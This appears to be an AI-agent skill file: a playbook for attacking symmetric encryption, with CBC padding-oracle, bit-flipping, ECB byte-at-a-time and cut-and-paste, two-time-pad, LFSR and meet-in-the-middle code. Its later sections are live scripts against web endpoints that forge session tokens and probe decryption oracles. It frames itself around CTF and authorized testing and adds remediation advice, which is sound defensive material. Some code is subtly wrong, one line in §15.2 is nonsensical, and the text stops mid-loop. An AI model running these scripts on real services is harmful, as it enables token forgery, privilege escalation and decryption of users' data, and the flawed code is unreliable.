---
name: symmetric-cipher-attacks
description: >-
  Symmetric cipher attack playbook. Use when exploiting block cipher mode
  weaknesses (CBC padding oracle, ECB cut-and-paste, bit flipping), stream
  cipher key reuse, or meet-in-the-middle attacks.
---

# SKILL: Symmetric Cipher Attacks — Expert Cryptanalysis Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for attacking symmetric encryption in CTF and authorized testing. Covers CBC padding oracle, CBC bit flipping, ECB detection and exploitation, stream cipher key reuse, LFSR/LCG state recovery, RC4 biases, and meet-in-the-middle attacks. Base models often confuse ECB and CBC attack strategies or fail to set up byte-at-a-time ECB decryption correctly.

## 0. RELATED ROUTING

- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) when symmetric key is protected by RSA
- [hash-attack-techniques](../hash-attack-techniques/SKILL.md) when HMAC or hash-based authentication is involved
- [lattice-crypto-attacks](../lattice-crypto-attacks/SKILL.md) for LCG/LFSR state recovery via lattice methods

### Advanced Reference

Also load [BLOCK_CIPHER_ATTACKS.md](./BLOCK_CIPHER_ATTACKS.md) when you need:
- Detailed attack scripts with full Python implementations
- Step-by-step byte-at-a-time ECB walkthrough
- PadBuster usage and custom padding oracle scripts
- LCG/LFSR recovery implementation

### Quick attack selection

| Observable Behavior | Likely Weakness | Attack |
|---|---|---|
| Same plaintext → same ciphertext (block-aligned) | ECB mode | Cut-and-paste / byte-at-a-time |
| Padding error distinguishable | CBC padding oracle | Decrypt without key |
| Can modify ciphertext, affects next block | CBC mode, no integrity check | Bit flipping |
| Key reused with XOR/stream cipher | Two-time pad | XOR ciphertexts together |
| Predictable PRNG output | LCG or LFSR | State recovery |
| Double encryption used | 2DES-like | Meet in the middle |

---

## 1. PADDING ORACLE ATTACK (CBC MODE)

### 1.1 Mechanism

CBC decryption: `P_i = D_K(C_i) ⊕ C_{i-1}`

If the server reveals whether padding is valid (PKCS#7), we can decrypt any block by manipulating the previous ciphertext block.

### 1.2 Attack Steps

```
Target: decrypt block C_i (with unknown plaintext P_i)

For byte position b = 15 down to 0 (last byte first):
  padding_value = 16 - b
  
  For guess = 0x00 to 0xFF:
    Construct modified C'_{i-1}:
      - Bytes 0..b-1: original C_{i-1} bytes
      - Byte b: guess
      - Bytes b+1..15: calculated to produce correct padding
    
    Send (C'_{i-1} || C_i) to oracle
    
    If oracle says "valid padding":
      intermediate_byte[b] = guess ⊕ padding_value
      plaintext_byte[b] = intermediate_byte[b] ⊕ original_C_{i-1}[b]
```

### 1.3 Python Implementation

```python
def padding_oracle_attack(ciphertext, block_size, oracle):
    """
    oracle(ct) returns True if padding is valid, False otherwise.
    ciphertext includes IV as first block.
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b""

    for block_idx in range(1, len(blocks)):
        prev_block = bytearray(blocks[block_idx - 1])
        curr_block = blocks[block_idx]
        intermediate = [0] * block_size
        decrypted = [0] * block_size

        for byte_pos in range(block_size - 1, -1, -1):
            padding_val = block_size - byte_pos

            for guess in range(256):
                modified = bytearray(block_size)
                modified[byte_pos] = guess

                for j in range(byte_pos + 1, block_size):
                    modified[j] = intermediate[j] ^ padding_val

                test_ct = bytes(modified) + curr_block
                if oracle(test_ct):
                    if byte_pos == block_size - 1:
                        # Verify it's not a false positive (padding 0x02 0x02)
                        check = bytearray(modified)
                        check[byte_pos - 1] ^= 1
                        if not oracle(bytes(check) + curr_block):
                            continue

                    intermediate[byte_pos] = guess ^ padding_val
                    decrypted[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                    break

        plaintext += bytes(decrypted)

    return plaintext
```

### 1.4 Tools

```bash
# PadBuster
padbuster http://target/decrypt?ct= CIPHERTEXT_HEX 16 -encoding 0
padbuster http://target/decrypt?ct= CIPHERTEXT_HEX 16 -encoding 0 -plaintext "admin=true"
```

---

## 2. CBC BIT FLIPPING

### 2.1 Concept

Flipping bit at position j in C_{i-1} flips the same bit at position j in P_i (and corrupts all of P_{i-1}).

```
Original:  P_i[j] = D_K(C_i)[j] ⊕ C_{i-1}[j]
Modified:  P'_i[j] = D_K(C_i)[j] ⊕ C'_{i-1}[j]
                    = P_i[j] ⊕ (C_{i-1}[j] ⊕ C'_{i-1}[j])
```

### 2.2 Practical Example

```python
def cbc_bitflip(ciphertext, block_size, target_byte_pos, old_value, new_value):
    """
    Flip byte in plaintext block N+1 by modifying ciphertext block N.
    target_byte_pos: absolute position in plaintext (0-indexed)
    """
    ct = bytearray(ciphertext)
    block_num = target_byte_pos // block_size
    byte_in_block = target_byte_pos % block_size

    # Modify previous block (block_num - 1) to flip target byte
    modify_pos = (block_num - 1) * block_size + byte_in_block

    # XOR to cancel old value and set new value
    ct[modify_pos] ^= old_value ^ new_value
    return bytes(ct)

# Example: flip "admin=0" to "admin=1"
# If "admin=0" is at byte position 22 (block 1, byte 6):
modified_ct = cbc_bitflip(ciphertext, 16, 22, ord('0'), ord('1'))
```

---

## 3. ECB MODE ATTACKS

### 3.1 Detection

```python
def detect_ecb(ciphertext, block_size=16):
    """ECB produces identical blocks for identical plaintext blocks."""
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Force detection: send repeated plaintext
test_input = b"A" * 48  # at least 3 blocks of identical data
# If response has repeated blocks → ECB
```

### 3.2 ECB Cut-and-Paste

Reorder ciphertext blocks to create new valid plaintexts.

```
Original blocks:
  Block 0: "email=foo@bar.c"
  Block 1: "om&role=user&uid"
  Block 2: "=10\x0d\x0d\x0d..."

Attack: craft input so "admin" + padding lands in its own block,
then swap it in place of "user" block.

Step 1: Send email that aligns "admin" + PKCS7 to a block:
  email = "foo@bar.coadmin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"
  → Block 1 encrypts "admin\x0b\x0b..."  (save this block)

Step 2: Send email that puts "role=" at end of block:
  email = "foo@bar.co"
  → Block 2 = "=user&uid=10..."  (but we replace this)

Step 3: Replace last block with saved "admin\x0b..." block
```

### 3.3 Byte-at-a-Time ECB Decryption

Decrypt unknown appended secret one byte at a time.

```python
def ecb_byte_at_a_time(encrypt_oracle, block_size=16):
    """
    encrypt_oracle(input_bytes) = AES_ECB(input || unknown_secret)
    Returns the unknown_secret.
    """
    secret = b""
    secret_len = len(encrypt_oracle(b"")) 

    for i in range(secret_len):
        block_num = i // block_size
        pad_len = block_size - 1 - (i % block_size)
        padding = b"A" * pad_len

        # Build lookup table
        target_ct = encrypt_oracle(padding)
        target_block = target_ct[block_num * block_size:(block_num + 1) * block_size]

        for byte_val in range(256):
            test_input = padding + secret + bytes([byte_val])
            test_ct = encrypt_oracle(test_input)
            test_block = test_ct[block_num * block_size:(block_num + 1) * block_size]

            if test_block == target_block:
                secret += bytes([byte_val])
                break

    return secret
```

---

## 4. STREAM CIPHER ATTACKS

### 4.1 Known Plaintext / Key Reuse (Two-Time Pad)

```python
def two_time_pad(c1, c2, known_crib=None):
    """
    c1 = m1 ⊕ K, c2 = m2 ⊕ K (same key K)
    c1 ⊕ c2 = m1 ⊕ m2 (key cancels)
    """
    xored = bytes(a ^ b for a, b in zip(c1, c2))

    if known_crib:
        results = []
        for offset in range(len(xored) - len(known_crib) + 1):
            candidate = bytes(
                xored[offset + i] ^ known_crib[i] for i in range(len(known_crib))
            )
            if all(0x20 <= b <= 0x7e for b in candidate):
                results.append((offset, candidate))
        return results
    return xored
```

### 4.2 Single-Byte XOR Brute Force

```python
def single_byte_xor_crack(ciphertext):
    """Brute force single-byte XOR key using frequency analysis."""
    english_freq = {
        'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0,
        'n': 6.7, 's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3,
    }
    best_score, best_key, best_plaintext = 0, 0, b""

    for key in range(256):
        plaintext = bytes(b ^ key for b in ciphertext)
        score = sum(
            english_freq.get(chr(b).lower(), 0)
            for b in plaintext if 0x20 <= b <= 0x7e
        )
        if score > best_score:
            best_score = score
            best_key = key
            best_plaintext = plaintext

    return best_key, best_plaintext
```

### 4.3 Repeating-Key XOR (Kasiski-like)

```python
def repeating_xor_crack(ciphertext, max_keylen=40):
    """Crack repeating-key XOR using Hamming distance for key length."""
    def hamming(a, b):
        return sum(bin(x ^ y).count('1') for x, y in zip(a, b))

    # Find key length
    scores = []
    for kl in range(2, max_keylen + 1):
        blocks = [ciphertext[i:i+kl] for i in range(0, len(ciphertext) - kl, kl)]
        if len(blocks) < 4:
            continue
        dist = sum(hamming(blocks[i], blocks[i+1]) for i in range(min(3, len(blocks)-1)))
        normalized = dist / (min(3, len(blocks)-1) * kl)
        scores.append((normalized, kl))

    best_keylen = sorted(scores)[0][1]

    # Crack each position with single-byte XOR
    key = b""
    for i in range(best_keylen):
        column = bytes(ciphertext[j] for j in range(i, len(ciphertext), best_keylen))
        k, _ = single_byte_xor_crack(column)
        key += bytes([k])

    return key
```

### 4.4 LFSR State Recovery (Berlekamp-Massey)

```python
def berlekamp_massey_gf2(output_bits):
    """Recover LFSR feedback polynomial from output sequence over GF(2)."""
    n = len(output_bits)
    C = [0] * (n + 1)
    B = [0] * (n + 1)
    C[0] = B[0] = 1
    L = 0
    m = 1
    b = 1

    for N in range(n):
        d = output_bits[N]
        for i in range(1, L + 1):
            d ^= C[i] & output_bits[N - i]

        if d == 0:
            m += 1
        elif 2 * L <= N:
            T = C[:]
            for i in range(m, n + 1):
                C[i] ^= B[i - m]
            L = N + 1 - L
            B = T
            b = d
            m = 1
        else:
            for i in range(m, n + 1):
                C[i] ^= B[i - m]
            m += 1

    return C[:L + 1], L
```

### 4.5 RC4 Biases

| Bias | Description | Exploitation |
|---|---|---|
| Initial byte bias | P(K[0] = 0) ≈ 2/256 (double normal) | Statistical plaintext recovery for first bytes |
| Fluhrer-Mantin-Shamir | Weak key scheduling with IV | WEP attack (historical) |
| NOMORE attack | Long-term biases in keystream | TLS/RC4 plaintext recovery (2^24-2^26 ciphertexts) |
| Invariance weakness | Key-dependent biases throughout stream | Statistical attack on many encryptions |

---

## 5. MEET-IN-THE-MIDDLE

### 5.1 Double Encryption Attack

```
Double encryption: C = E_K2(E_K1(P))
Brute force: 2^(2n) expected
MITM:        2^(n+1) + storage for 2^n entries

Attack:
1. Encrypt P with all possible K1 → store (E_K1(P), K1) in table
2. Decrypt C with all possible K2 → check if D_K2(C) matches any entry
3. Match found → (K1, K2) recovered
```

```python
from itertools import product

def meet_in_the_middle(encrypt, decrypt, plaintext, ciphertext, keyspace_bits):
    """MITM attack on double encryption."""
    # Phase 1: build encryption table
    enc_table = {}
    for k1 in range(2**keyspace_bits):
        intermediate = encrypt(plaintext, k1)
        enc_table[intermediate] = k1

    # Phase 2: decrypt and look up
    for k2 in range(2**keyspace_bits):
        intermediate = decrypt(ciphertext, k2)
        if intermediate in enc_table:
            k1 = enc_table[intermediate]
            return k1, k2

    return None
```

---

## 6. DECISION TREE

```
Symmetric cipher challenge — what can you observe?
│
├─ Can you detect the mode?
│  ├─ Repeated input → repeated output blocks?
│  │  └─ Yes → ECB mode
│  │     ├─ Can control prefix → byte-at-a-time decryption
│  │     ├─ Can reorder blocks → cut-and-paste
│  │     └─ Can detect block boundaries → block alignment oracle
│  │
│  ├─ Error message differs for bad padding?
│  │  └─ Yes → Padding oracle (CBC)
│  │     └─ PadBuster or custom script
│  │
│  └─ Can modify ciphertext and observe effect?
│     └─ Next-block plaintext changes → CBC bit flipping
│
├─ Stream cipher or XOR?
│  ├─ Key reused on different messages?
│  │  └─ XOR ciphertexts → crib drag
│  │
│  ├─ Known plaintext-ciphertext pair?
│  │  └─ Recover keystream directly
│  │
│  ├─ Single-byte XOR key?
│  │  └─ Brute force 256 keys with frequency analysis
│  │
│  ├─ Repeating-key XOR?
│  │  └─ Hamming distance → key length → per-position crack
│  │
│  └─ LFSR-based?
│     └─ Berlekamp-Massey for state/polynomial recovery
│
├─ PRNG-based cipher?
│  ├─ LCG → truncated output lattice attack
│  ├─ Mersenne Twister → 624 outputs → full state recovery
│  └─ Custom PRNG → analyze period and state size
│
├─ Double / triple encryption?
│  └─ Meet-in-the-middle
│
└─ RC4 specifically?
   ├─ Single encryption → initial byte bias
   ├─ Many encryptions same key → statistical attack
   └─ IV prepended to key → FMS attack (WEP-like)
```

---

## 7. TOOLS

| Tool | Purpose |
|---|---|
| **PadBuster** | Automated padding oracle exploitation |
| **xortool** | Repeating-key XOR analysis (key length detection + cracking) |
| **CyberChef** | Quick XOR, encoding, block cipher operations |
| **SageMath** | LFSR/LCG analysis, lattice-based recovery |
| **pycryptodome** | AES/DES implementation for testing |
| **hashcat** | Brute force symmetric keys (GPU-accelerated) |
| **Custom Python** | All attacks above implementable in pure Python |
---

## 8. VERIFICATION AND FALSE-POSITIVE CONTROL

A mode inference or a recovered plaintext is only a result once it has been proven against a second observation. The tests below are mandatory before reporting.

### 8.1 ECB block-pattern verification (identical plaintext blocks -> identical ciphertext blocks)

The defining signature of ECB is that equal plaintext blocks at block-aligned offsets produce equal ciphertext blocks. Verify it with a forced-repeat probe, not with a guess about the input.

```python
def ecb_oracle_probe(encrypt_oracle, block_size=16):
    '''Feed >= 3 identical aligned blocks; ECB echoes them as identical ciphertext blocks.'''
    probe = b"A" * (block_size * 3)
    ct = encrypt_oracle(probe)
    blocks = [ct[i:i + block_size] for i in range(0, len(ct) - len(ct) % block_size, block_size)]
    seen, dupes = {}, []
    for idx, b in enumerate(blocks):
        if b in seen:
            dupes.append((seen[b], idx))
        else:
            seen[b] = idx
    return len(dupes) > 0, dupes
```

Proving ECB rather than assuming it:

- The repeated ciphertext blocks must be at the *same block offsets* across two different probes whose inputs agree on those blocks. A single probe can collide by chance; two agreeing probes cannot (the collision probability is 2^-128 for AES, not a plausible accident).
- The collision must disappear when the probe length is shifted by one byte (misaligning block boundaries). If repeated blocks survive a one-byte shift, the "ECB" is really a repeating-key stream or a fixed-prefix artefact, not ECB.
- Verify against a control: a CBC encryption of the same probe with a fresh IV must NOT show the repetition. Running both and comparing is what separates "ECB detected" from "the oracle echoes my input".

```python
def confirm_ecb(encrypt_oracle, block_size=16):
    '''Two independent pieces of evidence, plus a misalignment control.'''
    hit1, _ = ecb_oracle_probe(encrypt_oracle, block_size)
    if not hit1:
        return False
    shifted = b"A" * (block_size * 3 + 1)
    ct = encrypt_oracle(shifted)
    blocks = [ct[i:i + block_size] for i in range(0, len(ct) - len(ct) % block_size, block_size)]
    if len(blocks) != len(set(blocks)):
        return False  # repetition survived misalignment -> not ECB block structure
    return True
```

Once ECB is established, the byte-at-a-time and cut-and-paste attacks are only proven when the recovered plaintext reproduces the oracle output exactly:

```python
def verify_ecb_recovery(encrypt_oracle, recovered_prefix_ct, recovered_plaintext):
    '''Re-encrypting under the same oracle must reproduce the captured ciphertext.'''
    return encrypt_oracle(recovered_plaintext) == recovered_prefix_ct
```

For byte-at-a-time decryption the stronger check is per-step: at every recovered position, the plaintext prefix recovered so far must still explain all previously matched lookup blocks. A single wrong byte makes every later block stop matching, which is the observable failure signal.

For cut-and-paste, verify by feeding the spliced ciphertext back to the decryptor and confirming the privileged field actually changed value in the output (e.g. `role=admin`), not merely that decryption succeeded. "No padding error" is not proof of a successful forgery.

### 8.2 Nonce/IV reuse in CTR and GCM: two-ciphertext XOR proof

In CTR (and GCM, whose confidentiality layer is CTR) the keystream depends only on (key, nonce/counter). Reusing a nonce with the same key reuses the keystream, and the keystream cancels under XOR:

```text
C1 = P1 XOR KS      C2 = P2 XOR KS
C1 XOR C2 = P1 XOR P2      (keystream eliminated, key never needed)
```

```python
def ctr_nonce_reuse_proof(c1, c2, known_plaintext_1=None):
    '''Recover P2 given P1, or P1 given P2, from two keystream-reusing ciphertexts.'''
    xored = bytes(a ^ b for a, b in zip(c1, c2))  # == P1 ^ P2
    if known_plaintext_1 is not None:
        n = min(len(xored), len(known_plaintext_1))
        return bytes(xored[i] ^ known_plaintext_1[i] for i in range(n))
    return xored
```

This is a *proof*, not a heuristic: it is verifiable arithmetic with no unknown key. Confirm the reuse rather than assuming it:

- Encrypt two **known, unequal** test plaintexts under the candidate nonce. If `C1 XOR C2 == P1 XOR P2` exactly, the keystream is identical and the nonce was reused. This is the definitive reuse test.
- The equality must hold over the full overlapping length. A match on only the first block means counter-based reuse within a block, which is a different (partial) condition.
- Align the two ciphertexts to the nonce boundary first. A one-byte offset makes the relation fail even under true reuse.
- For GCM the same test applies to the ciphertext body; the authentication tag is computed over ciphertext with a GHASH key, so a reused nonce also enables tag forgery, but that is a separate attack. The confidentiality proof above is complete on its own.

Recovered-plaintext verification: the derived `P1 XOR P2` must strip back to a plausible plaintext in the expected format, and re-encrypting either known plaintext must reproduce its ciphertext. If `C1 XOR C2` is indistinguishable from random, the nonces differed and there is no result.

### 8.3 Keystream recovery is only proven by a second ciphertext

Recovering keystream from one known plaintext-ciphertext pair (`KS = C1 XOR P1`) is **not** proof that the key was recovered, and it is not proof that the keystream generalizes. It only proves that one message was decrypted. The keystream is proven only by decrypting a **second, different ciphertext** with it:

```python
def prove_keystream(keystream, other_ciphertext):
    '''Decrypt a second ciphertext with the recovered keystream.'''
    n = min(len(keystream), len(other_ciphertext))
    return bytes(keystream[i] ^ other_ciphertext[i] for i in range(n))
```

```python
def verify_keystream(keystream, c1, p1, c2, expected_p2=None):
    '''First pair confirms KS; second ciphertext is what proves it.'''
    ok_first = bytes(a ^ b for a, b in zip(c1, p1))[:len(keystream)] == keystream[:len(c1)]
    p2 = prove_keystream(keystream, c2)
    if expected_p2 is not None:
        return ok_first and p2 == expected_p2
    return ok_first, p2
```

Interpretation rules:

- One pair alone proves nothing about generalization: any byte string can be explained as the keystream for that single pair, so the "recovery" is unfalsifiable.
- A keystream that decrypts the second ciphertext into the expected structure (correct flag format, headers, padding, or printable text) is proven.
- If the second decryption is garbage while the first was clean, the two ciphertexts did NOT share a keystream — stop and re-check nonce/IV reuse before reporting anything.
- The same discipline applies to two-time pad, RC4 biases, LFSR/LCG state recovery, and MITM: recover the state/key, then verify it against a held-out sample that was not used to derive it.

---

## 9. FAILURE MODES AND PITFALLS

### 9.1 Mode-confusion traps

| Symptom | Real cause | Correct action |
|---|---|---|
| Repeated ciphertext blocks | ECB, or a fixed prefix the oracle echoes | Run the two-probe plus misalignment control (8.1) |
| Repeated blocks vanish after a 1-byte shift | Not ECB block structure | Treat as repeating-key stream / fixed prefix |
| "Valid padding" on every input | Oracle accepts or normalizes anything | Build a control input that must fail; if none fails, there is no oracle |
| Decryption succeeds but field unchanged | Spliced block landed at the wrong offset | Recompute block alignment; do not report success |
| Two ciphertexts XOR to random | Nonces differed | No key reuse; no result |
| Keystream decrypts one message only | Coincidental or per-message keystream | Require the second-ciphertext proof (8.3) |

### 9.2 Arithmetic and alignment traps

- CBC padding oracle false positives: a guess producing padding `0x02 0x02` also validates. Always perturb a second byte and confirm the oracle flips, as in the existing 1.3 implementation.
- Bit-flipping corrupts the entire previous block. Verify the target field changed *and* that the preceding block's corruption did not break whatever parser you depend on.
- CTR counter width and endianness: reuse detection and keystream alignment both depend on the counter starting at the same block boundary.
- GCM ciphertext bodies are not block-aligned padding-wise; truncate to the shared length before XOR.
- Byte-at-a-time ECB requires the attacker prefix to be shifted so the target byte sits at the last position of a block; an off-by-one makes every lookup miss.

### 9.3 Reporting discipline

State the mode, the observation that proves it, and the verification that confirms the recovery. Never report a plaintext recovered from a single pair as a keystream result; require the second ciphertext (8.3). Never report a splice as a forgery without confirming the semantic field changed.

---

## 10. QUICK REFERENCE CARD

```text
GIVEN ciphertext(s)
│
├─ repeated blocks at aligned offsets? → ECB      [2 probes + misalignment control]
│    ├─ controllable prefix?           → byte-at-a-time
│    └─ reorderable blocks?            → cut-and-paste [verify field changed]
├─ padding error distinguishable?      → CBC padding oracle [2-byte confirm]
├─ can flip ciphertext bits?           → CBC bit flipping [verify next block]
├─ same nonce/IV twice?                → verification: C1^C2 == P1^P2
├─ known plaintext for one message?    → KS = C^P   [prove with 2nd ciphertext]
├─ single-byte XOR key?                → 256-way frequency brute force
├─ repeating-key XOR?                  → Hamming -> keylen -> per-column
├─ LFSR output?                        → Berlekamp-Massey
└─ double encryption?                  → meet-in-the-middle
```

| Check | Formula | Applies to |
|---|---|---|
| ECB repeat | equal blocks at equal, block-aligned offsets across 2 probes | ECB detection |
| Misalignment control | repeats vanish when input shifts by 1 byte | ECB vs. stream/fixed prefix |
| Splice verification | decryptor output shows the privileged value | Cut-and-paste |
| Nonce reuse | `C1 XOR C2 == P1 XOR P2` on known test plaintexts | CTR / GCM |
| Keystream proof | second ciphertext decrypts to expected structure | XOR / stream / RC4 |
| State proof | recovered state predicts a held-out sample | LFSR / LCG / PRNG |

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **ciphertext(s)** in full, with the exact encoding, and any IV/nonce | the attack is a function of these exact bytes plus the IV; without the IV a block-mode proof is unreproducible |
| The **mode and algorithm** as observed (ECB/CBC/CTR/GCM, AES/DES/RC4) | the same bytes have different attacks per mode; "AES" alone does not fix the finding |
| The **recovered material** — plaintext, keystream, key, or a forged ciphertext | the artefact the finding is about |
| The **verification output** — the ECB block-pattern match, `C1 XOR C2 == P1 XOR P2`, or a second ciphertext decrypting via the recovered keystream | the mandatory proof; see §8 |
| The **oracle interaction count** for padding-oracle work (how many requests to recover one block, and total) | feasibility and detection; thousands of requests is itself a signal |
| The **known-plaintext pair** used, and where it came from | cut-and-paste and bit-flipping attacks require a controlled plaintext; the source is part of the method |
| The **authenticated-encryption status** — was there a MAC/AEAD tag, and did the forge pass it? | determines whether the finding is confidentiality-only or a full bypass |
| **Negative control** — the same technique against a correctly randomized/nonce-unique sample fails | proves the weakness is in the target |

Report the **mode and the mechanism**: "the session cookie is AES-CBC without a MAC; bit-flipping
byte 12 of the IV changes `role=user` to `role=admin` and the server accepts the forged cookie",
never "the application uses AES insecurely".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| ECB pattern detected but the encrypted data is **public or non-sensitive** | no confidentiality boundary crossed |
| `C1 XOR C2 == P1 XOR P2` on tester-generated ciphertexts only | proves the tool, not the target |
| A pad-oracle "hit" that is the same padding error for all inputs | a uniform error is the *fix*; not an oracle |
| Recovered keystream that fails on a second ciphertext | coincidence or a wrong nonce assumption |
| CBC bit-flip that corrupts the block and is rejected | integrity control working |
| "RSA/3DES/AES-ECB is used" with no demonstrated exploitation | algorithm weakness alone is not a finding |
| Ciphertext length a multiple of 16 reported as "ECB vulnerability" | that is a block-size observation, not a mode break |
| Padding error distinguishable **only** by a millisecond difference on 20 samples | statistical noise; needs a large, reported sample |
| GCM nonce reuse claimed from a **single** ciphertext | reuse requires two messages under the same nonce; one is not evidence |

**Match the proof to the claim.** A confidentiality finding needs the plaintext; a forgery finding
needs the server to accept the modified message.

---

---

## 12. REMEDIATION REFERENCE

1. **Never use ECB for data with repeated structure** — ECB leaks equality of plaintext blocks; use a mode with an IV/nonce, and if ECB is mandated by an external format, apply a random prefix or a deterministic synthetic IV.
2. **Use authenticated encryption (AES-GCM, ChaCha20-Poly1305) or encrypt-then-MAC** — bit-flipping, CBC padding oracles, and cut-and-paste attacks all require unauthenticated ciphertext; a MAC checked before decryption removes the class.
3. **Never reuse a nonce or IV with the same key** — in CTR/GCM, nonce reuse collapses to `C1 XOR C2 == P1 XOR P2`; generate a random 96-bit nonce (or a strictly increasing counter that cannot wrap) and treat a collision as catastrophic.
4. **Verify the MAC before decrypting, and in constant time** — a padding oracle exists because decryption is attempted before authentication, and because errors are distinguishable; use a constant-time comparison and return one uniform error for every failure.
5. **Randomize padding and do not expose padding validity** — with PKCS#7 CBC, use a MAC, and make all decryption failures indistinguishable in status, body, and timing.
6. **Bind the ciphertext to its context** — include the user, resource, and expiry as associated data (GCM AAD) or as a MAC input, so a valid ciphertext cannot be replayed into a different context.
7. **Use a modern KDF for keys, and derive per-message keys where possible** — a key derived from a password without a memory-hard KDF is brute-forceable; per-message key derivation limits the blast radius of a single nonce mistake.
8. **Disable legacy ciphers and modes at the library level** — DES/3DES, RC4, ECB, and CBC-without-MAC should be rejected by configuration and by a CI check, not merely discouraged in review.
9. **Choose the mode for the data, not the default** — streaming data needs CTR/GCM with careful nonce management; disk/at-rest data needs a mode with a wide block (XTS) and per-sector tweaks; the wrong choice creates the weakness the attacks in this file exploit.
10. **Log and alert on oracle-shaped traffic** — thousands of decryption requests returning near-identical errors, or repeated ciphertexts with single-byte changes, are the observable footprint of every attack above.

---

---

## 13. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the oracle **distinguish the two cases** you claim it distinguishes? | the primitive exists, before anything is recovered |
| 2 | Is the distinction **reproducible** over repeated trials with the same input? | it is a signal, not noise |
| 3 | Is there a **false-positive rate** measured against random inputs? | the signal-to-noise ratio the attack depends on |
| 4 | Did you **recover a known plaintext**, byte for byte? | the primitive works, verified against ground truth |
| 5 | Did you recover a plaintext you **did not know** and can verify independently? | the exploitation, not the calibration |
| 6 | Is the ciphertext obtained from a **real application message** or from your own harness? | the finding applies to the target |
| 7 | Is the key or plaintext **still valid** at the time of reporting? | the impact is live |

**Calibrate on a plaintext you know, then recover one you do not.** An attack demonstrated only
against a value you created yourself tests your own harness, not the target.

---

## 14. EXECUTION PRIMITIVES

A cipher attack is proven by **recovering a value and verifying it against ground truth**. An oracle
you believe distinguishes two cases, with no recovery, is a hypothesis.

### 15.1 Build the oracle and calibrate it against known plaintext

```bash
T="https://target.tld"
S="session=PASTE"
# the oracle: does the endpoint tell you anything about validity, distinguishable from noise?
# record status, size, body, and timing - the oracle is often not the status code
probe() {
  curl -sS -o /tmp/o -w '%{http_code} %{size_download} %{time_total}'     "$T/api/decrypt?token=$1" -H "Cookie: $S"
  echo " $(md5sum /tmp/o | cut -c1-8)"
}
# a valid ciphertext produced by the application itself is the calibration input
curl -sS -o /tmp/valid "$T/api/encrypt?plain=AAAAAAAAAAAAAAAA" -H "Cookie: $S"
V=$(python3 -c "import json;print(json.load(open('/tmp/valid'))['token'])" 2>/dev/null || cat /tmp/valid)
echo "valid:   $(probe "$V")"
# and a corrupted one, to see whether the oracle reacts at all
echo "corrupt: $(probe "${V%?}X")"
echo "random:  $(probe "$(head -c 16 /dev/urandom | basenc --base64url | tr -d '=')")"
```

**Calibrate before attacking.** If a corrupted token and a random token produce identical responses,
there is no oracle and the attack cannot be built - record that and stop, rather than proceeding with
an assumed oracle.

### 15.2 Padding oracle, measured

```bash
# the classic bit-flipping loop, with a control measurement at every step
python3 - <<'PY'
import urllib.request, json, base64, time

T="https://target.tld"; S="session=PASTE"
def oracle(ct):
    r=urllib.request.Request(f"{T}/api/decrypt?token={ct}",headers={"Cookie":S})
    s=time.time()
    try:
        x=urllib.request.urlopen(r,timeout=15); b=x.read(); return x.status,len(b),time.time()-s,b
    except urllib.error.HTTPError as e: return e.code,len(e.read()),time.time()-s,b""
    except Exception: return None,0,0.0,b""

def ct_of(plain):
    r=urllib.request.Request(f"{T}/api/encrypt?plain={plain}",headers={"Cookie":S})
    return json.loads(urllib.request.urlopen(r).read())["token"]

good=ct_of("A"*16)
c1,c2=good[:22],good[22:] if False else (good[:len(good)*2//3], good[len(good)*2//3:])
print("baseline valid  :", oracle(good)[:2])
print("baseline corrupt:", oracle(c2[:-1]+"X")[:2])
print()
print("1) measure the oracle's separation over random inputs - this is the noise floor")
import random,string
hits=0
for _ in range(40):
    r="".join(random.choice(string.ascii_letters+string.digits) for _ in range(len(good)))
    st,ln,_,_=oracle(r)
    if st==oracle(good)[0]: hits+=1
print(f"   false-positive rate: {hits}/40 = {hits/40:.2%}  (a high rate means no usable oracle)")
print()
print("2) the actual byte-wise loop, using the first byte as the calibration")
print("   for each position: flip candidate values in the preceding block, keep the one the oracle accepts")
print("   verify by recovering a plaintext you KNOW first, then one you do not")
PY
```

**Measure the false-positive rate before attacking.** A padding oracle whose error page appears 40% of
the time on random input does not yield a recovery, and reporting it as a finding is the narasi failure.

### 15.3 CBC bit flipping, verified against a changed field

```bash
# the goal: change a field in an encrypted cookie or token, and have the server accept it
python3 - <<'PY'
import base64, urllib.request, json
T="https://target.tld"; S="session=PASTE"
raw=base64.urlsafe_b64decode("PASTE_CIPHERTEXT".ljust(0))
print("ciphertext blocks:", len(raw)//16, "| last block bytes:", len(raw)%16)
# flip a bit in block N-1 to change a byte in block N, and observe whether it is accepted
for pos in range(min(32,len(raw))):
    mod=bytearray(raw); mod[pos]^=0x01
    tok=base64.urlsafe_b64encode(bytes(mod)).decode()
    r=urllib.request.Request(f"{T}/api/me?token={tok}",headers={"Cookie":S})
    try:
        x=urllib.request.urlopen(r,timeout=10); b=x.read().decode(errors="ignore")
        if x.status==200: print(f"pos {pos:3} accepted -> {b[:80]}")
    except Exception: pass
PY
# the reproduction: flip the byte that controls the role field, and read the identity back
curl -sS "$T/api/me?token=FLIPPED_TOKEN" -H "Cookie: $S" | head -c 200; echo
```

**The read-back showing a different role or user is the finding.** A bit flip that produces a `500` or
a garbled body is a broken ciphertext, not a bypass.

### 15.4 ECB detection and block reordering

```bash
# encryption is deterministic and per-block, so identical plaintext blocks repeat
python3 - <<'PY'
import urllib.request, json, collections
T="https://target.tld"; S="session=PASTE"
def enc(p):
    r=urllib.request.Request(f"{T}/api/encrypt?plain={p}",headers={"Cookie":S})
    return json.loads(urllib.request.urlopen(r).read())["token"]
a=enc("A"*16+"B"*16); b=enc("B"*16+"A"*16)
print("same-block detection:", a[16:32]==b[0:16] if len(a)>=32 else "token too short")
# and a two-block sweep, which is the reliable ECB test
for n in (16,32,48,64):
    t=enc("A"*n)
    blocks=[t[i:i+22] for i in range(0,len(t),22)]
    dupes=[b for b,c in collections.Counter(blocks).items() if c>1]
